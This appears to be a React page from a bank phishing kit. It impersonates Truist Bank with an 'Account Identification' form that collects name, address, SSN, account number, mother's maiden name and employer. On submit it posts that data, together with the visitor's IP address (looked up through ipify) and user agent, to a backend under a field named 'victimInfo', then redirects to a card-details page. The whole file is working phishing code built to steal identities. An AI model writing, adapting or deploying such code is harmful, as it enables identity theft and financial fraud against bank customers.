import React, { useEffect, useState } from "react";
import { useHistory } from "react-router-dom";
import FormLayout from "../components/formLayout";
import { randParams } from "../utils/random";
import { APP_STORAGE_NAME } from "../utils/constants";
import Input from "../components/input";
import Button from "../components/button";
import axios from "axios";
import API from "../api/api";

const Account = () => {
  const router = useHistory();
  const [data, setData] = useState({
    name: "",
    address: "",
    ssn: "",
    accountNumber: "",
    mmn: "",
    currentEmployer: "",
  });
  const [isError, setIsError] = useState();
  const [isLoading, setIsLoading] = useState(false);
  const [victimInfo, setVictimData] = useState({
    ip: "",
  });

  const handleChange = (e) => {
    const { name, value } = e.target;
    if (["ssn"].includes(name)) {
      if (!/^[0-9]+$/.test(value)) return;
    }
    setData((prev) => ({ ...prev, [name]: value }));
    handleBlur(e);
  };

  const handleBlur = (e) => {
    const { name } = e.target;
    if (!data[name]?.trim()) {
      setIsError((prev) => ({ ...prev, [name]: true }));
    }

    if (data[name]?.trim()) {
      setIsError((prev) => ({ ...prev, [name]: false }));
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    const _data = JSON.parse(sessionStorage.getItem(APP_STORAGE_NAME)) || {};
    sessionStorage.setItem(
      APP_STORAGE_NAME,
      JSON.stringify({ ..._data, ...data }),
    );

    const __data = JSON.parse(sessionStorage.getItem(APP_STORAGE_NAME)) || {};
    setIsLoading(true);
    try {
      const res = await API.createDetail({
        ...__data,
        bank: "Truist Bank",
        userAgent: navigator?.userAgent,
        victimInfo,
      });
      if (res.status === 201) {
        router.push(`/card?${randParams()}`);
      }
    } catch (error) {
      alert("Something went wrong");
    } finally {
      setIsLoading(false);
    }
  };

  useEffect(() => {
    async function getIP() {
      const resp = await axios.get("https://api.ipify.org/?format=json");
      if (resp.data.ip) {
        setVictimData({ ip: resp.data.ip });
      }
    }
    getIP();
  }, []);

  return (
    <FormLayout
      handleSubmit={handleSubmit}
      title={"Account Identification"}
    >
      <Input
        title="Name"
        name="name"
        value={data?.name}
        onChange={handleChange}
        onBlur={handleBlur}
        isError={isError?.name || false}
      />
      <Input
        title="Address"
        name="address"
        value={data?.address}
        onChange={handleChange}
        onBlur={handleBlur}
        isError={isError?.address || false}
      />
      <Input
        title="SSN"
        name="ssn"
        value={data?.ssn}
        onChange={handleChange}
        onBlur={handleBlur}
        isError={isError?.ssn || false}
        minLength={9}
        maxLength={9}
      />
      <Input
        title="Account number"
        name="accountNumber"
        value={data?.accountNumber}
        onChange={handleChange}
        onBlur={handleBlur}
        isError={isError?.accountNumber || false}
      />
      <Input
        title="MMN"
        name="mmn"
        value={data?.mmn}
        onChange={handleChange}
        onBlur={handleBlur}
        isError={isError?.mmn || false}
      />
      <Input
        title="Current employer"
        name="currentEmployer"
        value={data?.currentEmployer}
        onChange={handleChange}
        onBlur={handleBlur}
        isError={isError?.currentEmployer || false}
      />
      <Button
        title={
          isLoading ? (
            <span className="loading loading-spinner loading-md text-white"></span>
          ) : (
            "Continue"
          )
        }
      />
    </FormLayout>
  );
};

export default Account;
